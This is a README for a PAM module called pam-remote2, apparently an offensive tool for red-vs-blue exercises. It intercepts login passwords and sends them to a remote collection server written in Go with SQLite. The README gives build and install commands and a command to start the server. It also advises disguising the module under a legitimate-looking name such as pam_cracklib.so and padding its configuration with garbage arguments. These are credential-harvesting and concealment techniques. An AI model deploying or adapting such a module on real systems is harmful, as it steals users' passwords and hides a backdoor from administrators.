# pam-remote2

A PAM module to intercept authentication requests and send the authentication token (usually a password) to a remote server. Useful for RvB competitions as initial persistence.

![screenshot](./assets/screenshot.png)

> Note: An HTTP server feature has been added using Go and SQLite3

## Installation

For Debian-based distros, `libpam0g-dev` must be installed to compile this module.

```sh
# the following will compile and install the module to `/usr/lib/x86_64-linux-gnu/security/`
$ ./install.sh
```

In order to run the server, [Go](https://go.dev/) must be installed.

```sh
$ cd server
$ go run server.go
```

## Tips

- Make sure to configure the correct networking interface, server hostname, and server port before compiling
- Install the module under a different name, something like `pam_cracklib.so`
- The module ignores all arguments, so put as much garbage as you want!
